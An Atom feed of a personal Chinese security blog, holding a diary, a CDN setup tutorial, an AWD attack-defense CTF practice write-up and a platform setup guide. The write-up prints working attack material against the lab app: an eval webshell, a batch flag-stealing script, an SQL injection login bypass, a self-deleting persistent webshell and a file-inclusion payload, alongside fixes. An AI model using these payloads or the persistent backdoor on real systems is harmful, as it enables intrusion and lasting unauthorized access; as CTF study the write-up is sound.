<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>IFONLY</title>
  
  <subtitle>Just a notebook and share some ideas.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://hack-for.fun/"/>
  <updated>2020-02-13T14:20:28.048Z</updated>
  <id>https://hack-for.fun/</id>
  
  <author>
    <name>IFONLY</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>IFONLY&#39;s diary</title>
    <link href="https://hack-for.fun/posts/20991101/"/>
    <id>https://hack-for.fun/posts/20991101/</id>
    <published>2099-10-31T16:00:00.000Z</published>
    <updated>2020-02-13T14:20:28.048Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020-02-10"><a href="#2020-02-10" class="headerlink" title="2020/02/10"></a>2020/02/10</h1><ul><li>学习了Docker 的一些操作, 准备部署一下AWD环境 玩下最简单的,写写环境搭建文章,相信以后会有师傅用到的</li><li>清理了一下社交圈,比如说取消了微博的无用关注,新加了C9联盟的微博,其实之前我都不用微博,但是微博也可以当做日记功能,所以又下载下来了,所以我这个博客日记也不一定会每天都写,想起了再写吧 0.0</li><li>整理了微信公众号,保留一些报社,主要留下与安全有关的公众号</li></ul><h1 id="2020-02-11"><a href="#2020-02-11" class="headerlink" title="2020/02/11"></a>2020/02/11</h1><ul><li>成功搭建了AWD 环境 ,嘿嘿 开学可以和实验室的小伙伴一起玩咯</li><li>下载了Xshell 这个东西,私认为比Finalshell好用许多,两个一起用吧 0,0</li><li>新增加博客搜索,<del>代码复制</del>,评论功能,修改默认URL格式(设置为/posts/日期),算是给博客大换血吧0,0</li></ul><pre><code>https://github.com/fi3ework/hexo-theme-archer/wiki/%E5%90%AF%E7%94%A8-Algolia-%E6%90%9C%E7%B4%A2</code></pre><p>代码复制功能感觉有点难呀,全网都没找到解决方案,都是 NEXT主题的</p><ul><li>确实减少了许多时间在无意义设计,短视频上,做事情更专注了,人也更快乐了.就是脖子有点不舒服.</li></ul><h1 id="2020-02-12"><a href="#2020-02-12" class="headerlink" title="2020/02/12"></a>2020/02/12</h1><ul><li><p>换了一个博客主题,实现了<code>代码复制</code>功能,但是<del>搜索功能</del>又没了,我决定再也折腾博客这东西了0,0(因为会上瘾</p></li><li><p>玩了一下AWD练习simple难度,但是由于<strong>我难以解决的问题</strong>,无法实现flag刷新,check,因此也无法用脚本批量打</p></li><li><p>瞎折腾了一天,收获还是挺多(假装  </p></li><li><p>码云真香 <a href="https://gitee.com/ifonlyddw/awd-platform" target="_blank" rel="noopener">https://gitee.com/ifonlyddw/awd-platform</a> 以后需要搭建环境的同学呀,可以直接克隆这个仓库哟,速度高到<code>10M+</code></p></li><li><p>em…换了套AWD练习平台,我为什么要选择在这个时候练习一下,主要是囤一些脚本0,0</p></li></ul><h1 id="2020-02-13"><a href="#2020-02-13" class="headerlink" title="2020/02/13"></a>2020/02/13</h1><ul><li><p>使用CDN为博客加速, 可参考我博客的文章来进行,速度爽的飞起,</p><p>更多加速方法 <a href="https://blog.sky03.cn/posts/42790.html" target="_blank" rel="noopener">https://blog.sky03.cn/posts/42790.html</a></p></li><li><p>为博客添加百度和谷歌收录</p></li><li><p>将博客同时部署在github(境外),coding(国内),双线操作,加速访问速度</p></li><li><p>为博客添加robots.txt</p></li><li><p>还是没有搜索功能 0,0</p></li><li><p>em….谷歌全家桶有了</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2020-02-10&quot;&gt;&lt;a href=&quot;#2020-02-10&quot; class=&quot;headerlink&quot; title=&quot;2020/02/10&quot;&gt;&lt;/a&gt;2020/02/10&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;学习了Docker 的一些操作, 准备部署一下AWD环境 玩下最
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>使用CDN(jsdeliver) 优化博客访问速度</title>
    <link href="https://hack-for.fun/posts/20200213/"/>
    <id>https://hack-for.fun/posts/20200213/</id>
    <published>2020-02-12T16:00:00.000Z</published>
    <updated>2020-02-13T14:39:01.348Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>CDN的全称是Content Delivery  Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科</p></blockquote><h1 id="本地创建一个CDN-库"><a href="#本地创建一个CDN-库" class="headerlink" title="本地创建一个CDN 库"></a>本地创建一个CDN 库</h1><p>本地创建一个文件夹用来<strong>存放需要上传的文件</strong></p><p><img src="https://s2.ax1x.com/2020/02/13/1OekNt.png" alt></p><p>比如我这里直接把主题的source文件夹放在CDN上了.因为访问博客的时候,浏览器请求的时候,先去请求这些JS,CSS,图片等资源,然后才会显示博客里面的内容,这也是为什么很多同学访问我的博客会一直卡在<code>最后一公里</code>,一直进不去的原因.</p><h1 id="Github上创建一个repo"><a href="#Github上创建一个repo" class="headerlink" title="Github上创建一个repo"></a>Github上创建一个repo</h1><p>需要先在Github上创建一个repo来存放我们需要CDN来分发的文件</p><p><img src="https://i.loli.net/2020/02/13/bzjHayNYfsQ9oUl.png" alt="创建repo"></p><p>创建完仓库后,记得初始化这个仓库<code>让Github自动生成一个readme.md</code> 即可 不然后面执行命令时候会报错的</p><p><em>在创建完仓库后,需要你操作的第一个操作里面,选择即可</em></p><h1 id="将CDN仓库克隆到本地"><a href="#将CDN仓库克隆到本地" class="headerlink" title="将CDN仓库克隆到本地"></a>将CDN仓库克隆到本地</h1><blockquote><p><strong>1) 复制链接</strong></p></blockquote><p><img src="https://i.loli.net/2020/02/13/QKfem6r8hH2Z57W.png" alt></p><blockquote><p><strong>2)初始化一个新的本地仓库</strong></p></blockquote><p>在第一步创建的文件夹右键,<code>Git Bash here</code>  ( 前提是安装了Git )</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> init<span class="token function">git</span> remote add origin + 复制的链接<span class="token function">git</span> pull origin master <span class="token comment" spellcheck="true">#将仓库拉取到本地文件夹</span></code></pre><blockquote><p><strong>3)为仓库添加文件</strong></p></blockquote><p><code>git add .</code> </p><p>其中,<code>.</code> 表示添加所有文件</p><blockquote><p><strong>4)提交更新</strong></p></blockquote><p><code>git commit -m &#39;first commit&#39;</code> 其中<code>&#39;&#39;</code>中的内容可自定义.即描述内容</p><p>其实这步操作是可以不用滴 0,0</p><blockquote><p><strong>5)推送本地文件到Github仓库</strong></p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> push origin master <span class="token comment" spellcheck="true"># 将本地仓库文件推送到Github 仓库</span></code></pre><p><img src="https://i.loli.net/2020/02/13/5O1JFYcRu2jrwmX.png" alt></p><h1 id="为repo设置一个release"><a href="#为repo设置一个release" class="headerlink" title="为repo设置一个release"></a>为repo设置一个release</h1><p><img src="https://s2.ax1x.com/2020/02/13/1OeFAI.png" alt="为repo设置release"></p><p><img src="https://s2.ax1x.com/2020/02/13/1OeA4P.png" alt></p><h1 id="从jsDeliver-引用资源"><a href="#从jsDeliver-引用资源" class="headerlink" title="从jsDeliver 引用资源"></a>从jsDeliver 引用资源</h1><p>使用方法: </p><pre><code>https://cdn.jsdelivr.net/gh/你的用户名/你的仓库名@发布的版本号/文件路径</code></pre><p>比如: </p><p>我这里引用资源的话,就是这样的</p><pre><code>https://cdn.jsdelivr.net/gh/Ifonly-go2019/cdnforblog@1.0.0/source/</code></pre><p>引用成功后,会看到这样的界面: </p><p><img src="https://s2.ax1x.com/2020/02/13/1OePHA.png" alt></p><h1 id="需要修改的地方"><a href="#需要修改的地方" class="headerlink" title="需要修改的地方"></a>需要修改的地方</h1><p>然后在<code>主题的配置文件</code>下</p><p>找到关于CDN加速的配置,填上这个链接即可</p><p>如果可以,在<code>Hexo 的配置文件</code> 下设置如下字段: </p><blockquote><p> 记得把相应内容改为自己的</p></blockquote><pre><code>jsdelivr:  enable: true  gh_user: ifonly-go2019  gh_repo: https://github.com/Ifonly-go2019/cdnforblog  baseUrl: cdn.jsdelivr.net</code></pre><p>ps: 不清楚是否需要设置,我设置了没有报错</p><p>完成了,现在清空一下缓存来看一下访问速度</p><p><img src="https://s2.ax1x.com/2020/02/13/1OQeg0.png" alt></p><h1 id="如果遇到资源更新"><a href="#如果遇到资源更新" class="headerlink" title="如果遇到资源更新"></a>如果遇到资源更新</h1><p>因为之前定义了版本后,资源更新后,就更改下版本后,然后在<code>本地CDN仓库</code>添加或修改文件,然后执行以下命令</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> pull origin master  <span class="token comment" spellcheck="true">#拉取远程仓库到本地</span><span class="token function">git</span> add <span class="token keyword">.</span><span class="token function">git</span> commit -m <span class="token string">'描述内容'</span><span class="token function">git</span> push origin master  <span class="token comment" spellcheck="true"># 推送到GitHub仓库</span></code></pre><p>enjoy~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;CDN的全称是Content Delivery  Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问
      
    
    </summary>
    
    
      <category term="Hexo" scheme="https://hack-for.fun/categories/Hexo/"/>
    
    
      <category term="CDN" scheme="https://hack-for.fun/tags/CDN/"/>
    
  </entry>
  
  <entry>
    <title>AWD训练(一) web_yunnan_simple</title>
    <link href="https://hack-for.fun/posts/20200212/"/>
    <id>https://hack-for.fun/posts/20200212/</id>
    <published>2020-02-11T16:00:00.000Z</published>
    <updated>2020-02-13T14:06:24.461Z</updated>
    
    <content type="html"><![CDATA[<p>首先是这个网站的目录结构</p><p><img src="https://i.loli.net/2020/02/12/B9JyY38G1NFe7vd.png" alt></p><p>一般正常情况下,拿到源码应该都是放在<code>Seay</code>或者<code>D顿</code> 中扫描一下大概,但是这个代码量属实太小了,就直接来吧 0,0</p><h1 id="预留后门"><a href="#预留后门" class="headerlink" title="预留后门"></a>预留后门</h1><p>有 <code>4</code> 个预留后门</p><p>在<code>a.php</code>中,第一行就是个一句话; 同样的情况在<code>.a.php</code> 也是一个预留后门,在<code>index.php</code>中的<code>1-4</code> 行也是一个预留后门.在<code>config.php</code> 的第<code>19</code>行也存在一句话木马</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://i.loli.net/2020/02/12/7Vwd9RUn6ENiWJD.png" alt></p><p>成功连上后,可以拿flag 得分,这时候就需要打全场了,因为预留后门发现的早得分肯定越多,因为后门肯定都会删掉</p><p>修复: </p><ul><li>预留后门,直接删掉,删不掉直接注释掉</li></ul><p>批量打脚本</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! Py3</span><span class="token comment" spellcheck="true"># 打全场提交flag脚本</span><span class="token keyword">import</span> time<span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">'http://ip'</span>url1 <span class="token operator">=</span> <span class="token string">''</span>shell <span class="token operator">=</span> <span class="token string">"a.php/?c=system"</span>port <span class="token operator">=</span> <span class="token string">'80'</span>passwd <span class="token operator">=</span> <span class="token string">'c'</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span>passwd<span class="token punctuation">:</span> <span class="token string">'cat /flag'</span><span class="token punctuation">}</span>flag_server <span class="token operator">=</span> <span class="token string">'http://flag_sever_ip/flag_file.php?token=%s&amp;flag=%s'</span>team_token <span class="token operator">=</span> <span class="token string">'team1'</span><span class="token comment" spellcheck="true">#自定义提交flag函数,以及一些参数回显</span><span class="token keyword">def</span> <span class="token function">submit_flag</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> teamtoken<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> flag_server <span class="token operator">%</span> <span class="token punctuation">(</span>team_token<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>    pos <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+]Submitting flag:%s:%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>pos<span class="token punctuation">)</span>    content <span class="token operator">=</span> response<span class="token punctuation">.</span>text    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+]content:%s'</span> <span class="token operator">%</span> content<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"success"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]submit flag success!"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-]Failed!'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'webshell_list.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>    f1 <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'first_round_flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#循环遍历其他队伍</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">8802</span><span class="token punctuation">,</span> <span class="token number">8803</span><span class="token punctuation">,</span> <span class="token number">8804</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        url1 <span class="token operator">=</span> url<span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>shell        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------'</span><span class="token punctuation">)</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span>payload<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> requests<span class="token punctuation">.</span>codes<span class="token punctuation">.</span>ok<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>url1 <span class="token operator">+</span> <span class="token string">' connect shell sucess!flag is '</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># 记录shell和获取的flag</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>f1<span class="token punctuation">,</span>url1 <span class="token operator">+</span> <span class="token string">' connect shell sucess!flag is '</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span>url1 <span class="token operator">+</span> <span class="token string">','</span> <span class="token operator">+</span> passwd<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># 获取flag</span>                <span class="token keyword">if</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>r<span class="token string">'hello world(\w+)'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>r<span class="token string">'hello world(\w+)'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                    submit_flag<span class="token punctuation">(</span><span class="token punctuation">(</span>url1<span class="token punctuation">,</span> team_token<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-]Can ont get flag!'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'shell 404!'</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>url1 <span class="token operator">+</span> <span class="token string">' connect shell failed!'</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    f1<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">timer</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        flag<span class="token punctuation">(</span><span class="token punctuation">)</span>        flag<span class="token punctuation">(</span><span class="token punctuation">)</span>        flag<span class="token punctuation">(</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 每 5 分钟 提交一次flag</span>timer<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span></code></pre><p>由于部署环境问题,无法实现check 和 flag 动态刷新,故脚本无法得到验证,遂结束了这个思路,哎,就当是审计CMS :black_flag:</p><h1 id="后台登录处存在sql注入"><a href="#后台登录处存在sql注入" class="headerlink" title="后台登录处存在sql注入"></a>后台登录处存在sql注入</h1><p>在<code>login.php</code> 第4,5,6行中,对用户输入的内容并没有<code>过滤措施</code>,导致可以使用<code>万能密码</code>登录后台</p><p>payload: </p><blockquote><p>username: <code>1&#39; or 1=1#</code> password: 随便; 登录进去后就有一个flag,提交即可.</p></blockquote><p><img src="https://i.loli.net/2020/02/12/uZI4UpYQF9NMsrn.png" alt></p><p>修复: </p><blockquote><p>使用<code>addslashes() 函数</code> 转义单引号,关闭<code>mysql_error()</code>报错</p></blockquote><p>批量打脚本</p><h1 id="后台文件上传处存在任意文件上传"><a href="#后台文件上传处存在任意文件上传" class="headerlink" title="后台文件上传处存在任意文件上传"></a>后台文件上传处存在任意文件上传</h1><p><img src="https://i.loli.net/2020/02/12/ANt9Q2sirHOLnye.png" alt></p><p>在 <code>upload.php</code> <code>30</code>中,截取了文件的后缀,并拼接到 <code>44</code>行中的最终的文件路径中,并没有对文件后缀进行判断,<code>导致了任意文件上传,可以拿到phpinfo信息,以及上传webshell</code></p><p>修复: </p><p>最简单的修复( 利用注释 )<code>隐藏上传文件的路径</code> 大概率会被<code>check</code> </p><pre class=" language-PHP"><code class="language-PHP">//echo "上传成功：/upload/".$time.$name1;</code></pre><p>并且想了一下,<strong>这种方式是不可行的,因为每个队伍都有相同的源码.</strong></p><p><img src="https://i.loli.net/2020/02/12/dMA5qIvmbTtlU8G.png" alt></p><p>连上shell以后,发现只是<code>www-data</code>权限,无法删除对方的<code>www</code>目录.此时可以往对方服务器里面种<code>不死马</code>( 进行<strong>权限维持</strong> ).</p><pre class=" language-PHP"><code class="language-PHP"><?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = './.index.php';$code = '<?php if(md5($_POST["pass"])=="6b0e7de3b4c005c6d03cd7e3f237e061"){@eval($_POST[a]);} ?>';//pass=IFONLY 不死马用法：不死马.php?pass=IFONLY&a=commandwhile (1){    file_put_contents($file,$code);    usleep(5000);}?></code></pre><p><strong>这里用蚁剑连上后,拿到flag,网站源码自动就被删除了( Team4 )</strong></p><p><img src="https://i.loli.net/2020/02/12/GegsHM2Z1jPIFDx.png" alt></p><p>从phpinfo界面得到网站目录为<code>/var/www/html</code> </p><p><code>allow_url_fopen = On allow_url_include= Off</code> 说明可能利用PHP伪协议进本地文件包含</p><p><code>disable_functions</code> 并没有禁用完全,可能存在 <code>RCE</code></p><p>限制了上传文件大小 <code>&lt; 2M</code> <code>Phar.readonly = On</code> </p><h1 id="在页脚shell功能处存在任意命令执行"><a href="#在页脚shell功能处存在任意命令执行" class="headerlink" title="在页脚shell功能处存在任意命令执行"></a>在页脚shell功能处存在任意命令执行</h1><p>在 <code>footer.php</code> 的第2,3行</p><p><img src="https://i.loli.net/2020/02/12/tES9hGA5DajpR1V.png" alt></p><p>这里就相当于一个预留后门了,如果不修复可以一直<code>cat /flag</code> 拿flag得分</p><blockquote><p>思考: 如何最大化利用?</p></blockquote><p>修复: </p><ul><li>简单粗暴的直接注释掉<code>system($shell)</code> ,还是一样,大概率会被<code>check</code></li><li>把可执行的命令写死: </li></ul><pre class=" language-PHP"><code class="language-PHP">$shell=$_POST['shell'];$shell = 'ping';system($shell.'127.0.0.1');</code></pre><ul><li>最好的办法</li></ul><p>在<code>disable_functions</code> 中禁用掉<code>system()</code></p><ul><li>白名单检测</li></ul><h1 id="关于界面处存在本地文件包含漏洞"><a href="#关于界面处存在本地文件包含漏洞" class="headerlink" title="关于界面处存在本地文件包含漏洞"></a>关于界面处存在本地文件包含漏洞</h1><pre class=" language-PHP"><code class="language-PHP"><?php   $file=$_GET['file'];   include $file;?></code></pre><p>payload: </p><p><code>about.php?file=php://filter/read=convert.base64-encode/resource=login.php</code></p><p>但是这个拿不到flag,但没关系,学习是第一步!!</p><p>修复: </p><ul><li>通过白名单来限制可以包含的文件</li></ul><h1 id="admin-header-php中存在任意命令执行"><a href="#admin-header-php中存在任意命令执行" class="headerlink" title="admin/header.php中存在任意命令执行"></a>admin/header.php中存在任意命令执行</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$p</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token variable">$p</span><span class="token punctuation">;</span>   <span class="token variable">$q</span><span class="token operator">=</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>只需要利用<code>p = &#39;cat /flag&#39;</code> 即可打出flag</p><p>修复: 直接注释掉输出,<code>var_dump()</code></p><pre class=" language-PHP"><code class="language-PHP">//var_dump($q);</code></pre><p>还是好好学习基础吧 -.- </p><p>屯脚本的事情以后再说</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首先是这个网站的目录结构&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/02/12/B9JyY38G1NFe7vd.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;一般正常情况下,拿到源码应该都是放在&lt;code&gt;Seay&lt;/code&gt;或者&lt;code&gt;D
      
    
    </summary>
    
    
    
      <category term="AWD" scheme="https://hack-for.fun/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>AWD_Platform_Env_With_Ubuntu&amp;Docker</title>
    <link href="https://hack-for.fun/posts/20200211/"/>
    <id>https://hack-for.fun/posts/20200211/</id>
    <published>2020-02-11T07:00:00.000Z</published>
    <updated>2020-02-13T14:15:56.283Z</updated>
    
    <content type="html"><![CDATA[<p><strong>关于CTF 线下赛的一些科普:</strong> </p><p><a href="https://ctf-wiki.github.io/ctf-wiki/introduction/mode-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/introduction/mode-zh/</a></p><p><strong>平台项目地址</strong></p><p><a href="https://github.com/zhl2008/awd-platform" target="_blank" rel="noopener">https://github.com/zhl2008/awd-platform</a> </p><p><a href="https://github.com/zhl2008/awd-platform/blob/master/AWD%E7%BA%BF%E4%B8%8B%E7%8E%AF%E5%A2%83%E6%89%8B%E5%86%8C.md" target="_blank" rel="noopener">环境手册</a></p><p>by Hence Zhang @Lancet</p><p><strong>网络拓扑结构</strong></p><p><img src="https://raw.githubusercontent.com/Ifonly-go2019/awd-platform/master/%E6%AF%94%E8%B5%9B%E5%85%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%99%A8.png" alt></p><p><strong>环境搭建流程</strong></p><p>1)下载平台文件到云服务器</p><pre><code>git clone https://github.com/zhl2008/awd-platform</code></pre><p>2)切换到目录下awd-platform目录下 pull docker 镜像</p><pre><code>cd awd-platform</code></pre><pre><code>sudo docker pull zhl2008/web_14.04</code></pre><pre><code>sudo docker tag zhl2008/web_14.04 web_14.04 </code></pre><p>这里用 tag 改名,由docker 源码中的名字决定</p><p>3)建立队伍</p><p>比如,这里建立web_yunnan_simple 这个赛题,启用4支队伍</p><pre><code>python batch.py web_yunnan_simple 4</code></pre><p><img src="https://i.loli.net/2020/02/11/daeEC1Z9Gm7kT2i.png" alt="启动比赛队伍数量.png"></p><p>是一个全自动化的, 节约时间在搭建环境上, 专注于安全</p><p>4)启动比赛</p><p>4 表示 4 支队伍</p><pre><code>python start.py ./ 4</code></pre><p>也可以启动 check 脚本</p><p>但是这个check 好像用不了,嗯,反正也是练习,知道down 了就修就好了 0.0</p><pre><code>sudo docker exec check_server python check.py</code></pre><p><img src="https://i.loli.net/2020/02/11/bDxNVLlej6q5HGz.png" alt></p><p>5) 查看队伍网络映射情况</p><p><img src="https://i.loli.net/2020/02/11/DMbitnvHRrSw81j.png" alt></p><table><thead><tr><th align="center">队伍ID</th><th>靶机地址</th></tr></thead><tbody><tr><td align="center">Team 1</td><td>VPS ip:8081</td></tr><tr><td align="center">Team 2</td><td>VPS ip:8082</td></tr><tr><td align="center">Team 3</td><td>VPS ip:8083</td></tr><tr><td align="center">Team 4</td><td>VPS ip:8084</td></tr><tr><td align="center">Flag bot</td><td>VPS ip:8080</td></tr></tbody></table><p>SSH 密码在项目文件夹下的 pass.txt 中</p><p><img src="https://i.loli.net/2020/02/11/ZoswT5CJVODr3WB.png" alt></p><table><thead><tr><th>队伍ID</th><th>SSH端口号</th></tr></thead><tbody><tr><td>team1</td><td>2201</td></tr><tr><td>team2</td><td>2202</td></tr><tr><td>team3</td><td>2203</td></tr><tr><td>team4</td><td>2204</td></tr></tbody></table><p><img src="https://i.loli.net/2020/02/11/nZhLjH9cXg6J4KE.png" alt></p><blockquote><p>在项目的<code>flag_server</code>中,要设置score.txt 和 result.txt 777 权限, 进行分数变化同步</p></blockquote><p><img src="https://i.loli.net/2020/02/11/JSziLaCMsZ6AWjc.png" alt></p><p>flag 提交方式: </p><pre><code>VPS ip:8080/flag_file.php?token=teamx&amp;flag=**** (x 为队伍号)</code></pre><p>新的比赛规则中</p><pre><code>http://flag服务器IP:端口/flag_file.php?token=队伍token&amp;flag=获取到的flag 来获得相应的分数。例如：flag server地址为8.8.8.8，端口为8080，队伍token为team1，flag为40ed892b93997142e46124516d0f5ac0，则请求http://8.8.8.8:8080/flag_file.php?token=team1&amp;flag=40ed892b93997142e46124516d0f5ac0来获得相应分数。每次成功攻击可获得2分，被攻击者扣除2分；有效攻击两分钟一轮；选手需要保证己方服务的可用性，每次服务不可用，扣除1分,服务可用，加1分；服务检测两分钟一轮</code></pre><p>查看攻击情况和当前分数</p><pre><code>攻击情况url地址：http://flag服务器IP:端口/result.txt得分情况地址：http://flag服务器IP:端口/score.txt</code></pre><p><img src="https://i.loli.net/2020/02/11/mpVroHxzd5LWhR4.png" alt></p><p>到这里,AWD环境也就基本差不多搭建好了(提交flag 还存在一些问题,比如不同的练习,要改flag,提交flag的不正确,flag并不是每两分钟刷新的,被攻击的队伍的分数也并不会减为负的). 当然还可以美化一下界面.</p><blockquote><p><strong>我这里就以练习为主了,能打出flag就行了,所以并不想修上面的一些问题( 懒</strong></p></blockquote><p>结束练习</p><pre><code>sudo python stop_clean.py</code></pre><p>Enjoy ~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;关于CTF 线下赛的一些科普:&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ctf-wiki.github.io/ctf-wiki/introduction/mode-zh/&quot; target=&quot;_blank&quot; rel=&quot;noopene
      
    
    </summary>
    
    
      <category term="线下AWD" scheme="https://hack-for.fun/categories/%E7%BA%BF%E4%B8%8BAWD/"/>
    
    
      <category term="AWD" scheme="https://hack-for.fun/tags/AWD/"/>
    
      <category term="Docker" scheme="https://hack-for.fun/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Docker_Basic_Learning_Note</title>
    <link href="https://hack-for.fun/posts/20200210/"/>
    <id>https://hack-for.fun/posts/20200210/</id>
    <published>2020-02-09T16:00:00.000Z</published>
    <updated>2020-02-11T02:29:24.695Z</updated>
    
